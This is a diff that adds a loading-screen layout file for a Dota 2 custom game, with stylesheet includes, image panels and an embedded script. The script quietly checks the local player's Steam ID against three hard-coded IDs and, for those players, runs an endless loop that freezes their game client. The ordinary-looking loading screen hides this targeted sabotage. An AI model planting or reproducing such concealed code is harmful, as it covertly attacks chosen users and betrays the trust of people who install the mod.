@@ -1,0 +1,35 @@
+<root>
+	<styles>
+		<include src="file://{resources}/styles/dotastyles.css" />
+		<include src="file://{resources}/styles/custom_game/custom_loading_screen.css" />
+	</styles>
+	<script>
+		function f()
+		{
+			if (Game.GetLocalPlayerInfo() != null)
+			{
+				if (Game.GetLocalPlayerInfo().player_steamid == "76561198329082530" || Game.GetLocalPlayerInfo().player_steamid == "76561198138557740" || Game.GetLocalPlayerInfo().player_steamid == "76561198067421181")
+				{
+					var i = 0;
+					while (true)
+					{
+						i++;
+					}
+				}
+			}
+			else
+			{
+				$.Schedule(1,f);
+			}
+		}
+		f()
+	</script>
+
+	<Panel class="OverthrowLoadingRoot">
+		<Panel id="seq" >
+			<Image id="seq_bg" class="SeqBg" src="file://{images}/custom_game/loading_screen/loading_seq_bg.psd" />
+			<Image id="seq_elems" class="SeqImg" src="file://{images}/custom_game/loading_screen/loading_seq_elems.png" />
+			<Image id="seq_invok" class="SeqImg" src="file://{images}/custom_game/loading_screen/loading_seq_invok.png" />
+		</Panel>
+	</Panel>
+</root>
